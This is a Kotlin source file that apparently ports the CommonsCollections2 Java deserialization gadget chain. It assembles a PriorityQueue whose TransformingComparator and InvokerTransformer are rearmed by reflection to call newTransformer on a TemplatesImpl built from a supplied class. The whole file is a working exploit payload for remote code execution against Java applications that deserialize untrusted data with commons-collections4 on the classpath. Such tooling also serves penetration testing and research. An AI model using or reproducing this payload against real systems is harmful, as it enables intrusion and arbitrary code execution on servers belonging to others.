package com.xhstormr.app

import com.xhstormr.app.Gadgets.createTemplatesImpl
import java.util.PriorityQueue
import org.apache.commons.collections4.comparators.TransformingComparator
import org.apache.commons.collections4.functors.InvokerTransformer

object CommonsCollections2ObjectPayload : ObjectPayload {

    override fun getObject(clazz: Class<*>): Any {
        val templates = createTemplatesImpl(clazz)
        // mock method name until armed
        val transformer = InvokerTransformer<Any, Any>(
            "toString",
            arrayOfNulls(0),
            arrayOfNulls(0)
        )

        // create queue with numbers and basic comparator
        val queue = PriorityQueue(2, TransformingComparator(transformer))
        // stub data for replacement later
        queue.add(1)
        queue.add(1)

        // switch method called by comparator
        transformer.setFieldValue("iMethodName", "newTransformer")

        // switch contents of queue
        val queueArray = queue.getFieldValue("queue") as Array<Any>
        queueArray[0] = templates
        queueArray[1] = 1
        return queue
    }
}
